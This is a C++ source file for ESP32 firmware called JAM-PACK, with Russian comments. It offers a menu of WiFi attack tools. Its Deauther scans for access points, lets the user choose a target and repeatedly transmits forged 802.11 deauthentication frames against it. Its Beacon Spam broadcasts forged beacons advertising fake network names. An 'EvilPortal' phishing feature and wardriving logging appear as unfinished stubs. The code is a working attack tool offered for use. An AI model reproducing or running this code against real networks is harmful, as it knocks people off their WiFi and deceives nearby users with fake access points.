// ╔══════════════════════════════════════════╗
// ║    JAM-PACK · wifi_module.cpp           ║
// ║    Deauther с выбором точки доступа     ║
// ╚══════════════════════════════════════════╝

#include "wifi_module.h"
#include "display.h"
#include "input.h"
#include "config.h"

#include <WiFi.h>
#include <esp_wifi.h>

static const char* items[] = {
  "Deauther", "Beacon Spam", "EvilPortal", "Wardriving"
};
static const int COUNT = 4;

const char** wifi_items() { return items; }
int          wifi_count() { return COUNT; }

// ══════════════════════════════════════════
//  DEAUTHER — с выбором точки доступа
// ══════════════════════════════════════════

enum DeauthState {
  DEAUTH_SCANNING,   // сканируем AP
  DEAUTH_SELECT,     // выбираем AP из списка
  DEAUTH_RUNNING     // атакуем выбранную AP
};

static DeauthState deauthState = DEAUTH_SCANNING;
static int         apCount     = 0;
static int         apSelected  = 0;
static int         apScroll    = 0;
static uint32_t    packetCount = 0;

// Deauth пакет 802.11
static uint8_t deauthPacket[26] = {
  0xC0, 0x00,
  0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xF0, 0xFF,
  0x02, 0x00
};

static void deauther_reset() {
  deauthState  = DEAUTH_SCANNING;
  apCount      = 0;
  apSelected   = 0;
  apScroll     = 0;
  packetCount  = 0;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  WiFi.scanNetworks(true, false, false, 100);
}

static void deauther_run(uint32_t startTime) {

  // ── SCANNING ────────────────────────────
  if (deauthState == DEAUTH_SCANNING) {
    int result = WiFi.scanComplete();

    u8g2.clearBuffer();
    display_header("Deauther");
    u8g2.setFont(u8g2_font_6x10_mf);

    if (result == WIFI_SCAN_RUNNING) {
      static uint8_t dots = 0;
      static uint32_t dt  = 0;
      if (millis() - dt > 300) { dots = (dots+1)%4; dt = millis(); }
      u8g2.drawStr(2, 28, "Scanning APs");
      char d[5] = "    ";
      for(int i=0;i<(int)dots;i++) d[i]='.';
      u8g2.drawStr(74, 28, d);
    } else if (result == WIFI_SCAN_FAILED) {
      u8g2.drawStr(2, 28, "Scan failed!");
      u8g2.drawStr(2, 40, "OK to retry");
      if (btn_ok()) WiFi.scanNetworks(true, false, false, 100);
    } else {
      apCount     = result;
      deauthState = DEAUTH_SELECT;
    }

    display_statusbar("BACK", "");
    u8g2.sendBuffer();
    return;
  }

  // ── SELECT AP ───────────────────────────
  if (deauthState == DEAUTH_SELECT) {
    // навигация
    if (btn_up()) {
      apSelected = (apSelected - 1 + apCount) % apCount;
      if (apSelected < apScroll) apScroll = apSelected;
    }
    if (btn_down()) {
      apSelected = (apSelected + 1) % apCount;
      if (apSelected >= apScroll + 4) apScroll = apSelected - 3;
    }
    if (btn_ok()) {
      // выбрали — начинаем атаку
      packetCount = 0;
      deauthState = DEAUTH_RUNNING;
      return;
    }

    u8g2.clearBuffer();
    display_header("Select AP");
    u8g2.setFont(u8g2_font_5x7_mf);

    for (int i = 0; i < 4 && (i + apScroll) < apCount; i++) {
      int idx = i + apScroll;
      int y   = 12 + i * 12;
      String ssid = WiFi.SSID(idx);
      if (ssid.length() == 0) ssid = "[hidden]";
      if (ssid.length() > 18) ssid = ssid.substring(0, 17) + "~";

      char buf[32];
      snprintf(buf, sizeof(buf), "%s", ssid.c_str());

      if (idx == apSelected) {
        u8g2.drawBox(0, y - 8, 128, 10);
        u8g2.setDrawColor(0);
        u8g2.drawStr(1, y, ">");
        u8g2.drawStr(8, y, buf);
        // RSSI справа
        char rssi[8];
        snprintf(rssi, sizeof(rssi), "%ddB", WiFi.RSSI(idx));
        int rw = u8g2.getStrWidth(rssi);
        u8g2.drawStr(127 - rw, y, rssi);
        u8g2.setDrawColor(1);
      } else {
        u8g2.drawStr(8, y, buf);
        char rssi[8];
        snprintf(rssi, sizeof(rssi), "%ddB", WiFi.RSSI(idx));
        int rw = u8g2.getStrWidth(rssi);
        u8g2.drawStr(127 - rw, y, rssi);
      }
    }

    // скроллбар
    if (apCount > 4) {
      int barH = max(4, (int)(44 * 4 / apCount));
      int barY = 11 + (apScroll * (44 - barH) / (apCount - 4));
      u8g2.drawBox(126, barY, 2, barH);
    }

    display_statusbar("BACK", "OK SELECT");
    u8g2.sendBuffer();
    return;
  }

  // ── RUNNING — атакуем выбранную AP ──────
  if (deauthState == DEAUTH_RUNNING) {
    if (btn_back()) {
      deauthState = DEAUTH_SELECT;
      return;
    }

    uint8_t* bssid = (uint8_t*)WiFi.BSSID(apSelected);
    int ch = WiFi.channel(apSelected);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);

    for (int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      delay(5);
    }
    packetCount += 5;

    String ssid = WiFi.SSID(apSelected);
    if (ssid.length() == 0) ssid = "[hidden]";
    if (ssid.length() > 16) ssid = ssid.substring(0, 15) + "~";

    u8g2.clearBuffer();
    display_header("Deauther");
    u8g2.setFont(u8g2_font_6x10_mf);

    // мигающий индикатор атаки
    static bool blink = false;
    static uint32_t blinkT = 0;
    if (millis() - blinkT > 300) { blink = !blink; blinkT = millis(); }
    if (blink) {
      u8g2.drawBox(118, 1, 8, 9);
      u8g2.setDrawColor(0);
      u8g2.drawStr(119, 9, "!");
      u8g2.setDrawColor(1);
    }

    u8g2.drawStr(2, 22, "Target:");
    u8g2.drawStr(2, 32, ssid.c_str());

    char buf[24];
    snprintf(buf, sizeof(buf), "Ch: %d", ch);
    u8g2.drawStr(2, 42, buf);
    snprintf(buf, sizeof(buf), "Pkts: %lu", packetCount);
    u8g2.drawStr(2, 52, buf);

    display_statusbar("BACK", "RUNNING");
    u8g2.sendBuffer();
  }
}

// ══════════════════════════════════════════
//  BEACON SPAM
// ══════════════════════════════════════════
static const char* fakeSSIDs[] = {
  "Free_WiFi", "FBI_Van", "HackersNet",
  "NotYourWiFi", "TotallyLegit", "PleaseConnect",
  "DefinitelyNotVirus", "SkyNet", "Matrix"
};
static const int SSID_COUNT = 9;
static uint32_t beaconCount = 0;

static uint8_t beaconPacket[128];

static void beacon_spam_run(uint32_t startTime) {
  static int ssidIdx   = 0;
  static uint32_t lastSend = 0;

  if (millis() - lastSend > 80) {
    const char* ssid = fakeSSIDs[ssidIdx];
    int ssidLen = strlen(ssid);

    memset(beaconPacket, 0, sizeof(beaconPacket));
    // frame control
    beaconPacket[0] = 0x80; beaconPacket[1] = 0x00;
    // duration
    beaconPacket[2] = 0x00; beaconPacket[3] = 0x00;
    // dst broadcast
    memset(&beaconPacket[4], 0xFF, 6);
    // src random MAC
    beaconPacket[10] = 0xBA; beaconPacket[11] = random(256);
    beaconPacket[12] = random(256); beaconPacket[13] = random(256);
    beaconPacket[14] = random(256); beaconPacket[15] = random(256);
    // BSSID = src
    memcpy(&beaconPacket[16], &beaconPacket[10], 6);
    // seq
    beaconPacket[22] = 0x00; beaconPacket[23] = 0x00;
    // timestamp + interval + caps
    memset(&beaconPacket[24], 0, 8);
    beaconPacket[32] = 0x64; beaconPacket[33] = 0x00;
    beaconPacket[34] = 0x01; beaconPacket[35] = 0x04;
    // SSID IE
    beaconPacket[36] = 0x00;
    beaconPacket[37] = ssidLen;
    memcpy(&beaconPacket[38], ssid, ssidLen);
    // Rates IE
    int pos = 38 + ssidLen;
    beaconPacket[pos++] = 0x01; beaconPacket[pos++] = 0x08;
    beaconPacket[pos++] = 0x82; beaconPacket[pos++] = 0x84;
    beaconPacket[pos++] = 0x8B; beaconPacket[pos++] = 0x96;
    beaconPacket[pos++] = 0x24; beaconPacket[pos++] = 0x30;
    beaconPacket[pos++] = 0x48; beaconPacket[pos++] = 0x6C;
    // DS IE
    beaconPacket[pos++] = 0x03; beaconPacket[pos++] = 0x01;
    beaconPacket[pos++] = random(1, 14);

    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, pos, false);
    beaconCount++;
    ssidIdx  = (ssidIdx + 1) % SSID_COUNT;
    lastSend = millis();
  }

  u8g2.clearBuffer();
  display_header("Beacon Spam");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 22, "Broadcasting:");
  u8g2.drawStr(2, 32, fakeSSIDs[ssidIdx]);
  char buf[24];
  snprintf(buf, sizeof(buf), "Pkts: %lu", beaconCount);
  u8g2.drawStr(2, 44, buf);
  snprintf(buf, sizeof(buf), "t: %lus", (millis()-startTime)/1000UL);
  u8g2.drawStr(2, 54, buf);
  display_statusbar("BACK STOP", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  EVIL PORTAL
// ══════════════════════════════════════════
static void evil_portal_run(uint32_t startTime) {
  u8g2.clearBuffer();
  display_header("EvilPortal");
  u8g2.setFont(u8g2_font_6x10_mf);
  u8g2.drawStr(2, 24, "Put index.html");
  u8g2.drawStr(2, 34, "on SD card");
  u8g2.drawStr(2, 44, "[TODO]");
  display_statusbar("BACK", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  WARDRIVING
// ══════════════════════════════════════════
static void wardriving_run(uint32_t startTime) {
  static bool     scanning = false;
  static uint32_t lastScan = 0;
  static int      found    = 0;

  if (!scanning || millis() - lastScan > 3000) {
    WiFi.scanNetworks(true, false, false, 100);
    scanning = true;
    lastScan = millis();
  }

  int result = WiFi.scanComplete();
  if (result > 0) { found = result; scanning = false; }

  u8g2.clearBuffer();
  display_header("Wardriving");
  u8g2.setFont(u8g2_font_6x10_mf);
  char buf[24];
  snprintf(buf, sizeof(buf), "Found: %d APs", found);
  u8g2.drawStr(2, 24, buf);
  u8g2.drawStr(2, 34, scanning ? "Scanning..." : "Scan done");
  snprintf(buf, sizeof(buf), "t: %lus", (millis()-startTime)/1000UL);
  u8g2.drawStr(2, 44, buf);
  u8g2.drawStr(2, 54, "SD log: [TODO]");
  display_statusbar("BACK", "");
  u8g2.sendBuffer();
}

// ══════════════════════════════════════════
//  Главный вызов из menu.cpp
// ══════════════════════════════════════════
void wifi_run(int idx, uint32_t startTime) {
  static int lastIdx = -1;
  if (lastIdx != idx) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    beaconCount = 0;
    if (idx == 0) deauther_reset();
    lastIdx = idx;
  }
  switch (idx) {
    case 0: deauther_run(startTime);    break;
    case 1: beacon_spam_run(startTime); break;
    case 2: evil_portal_run(startTime); break;
    case 3: wardriving_run(startTime);  break;
  }
}
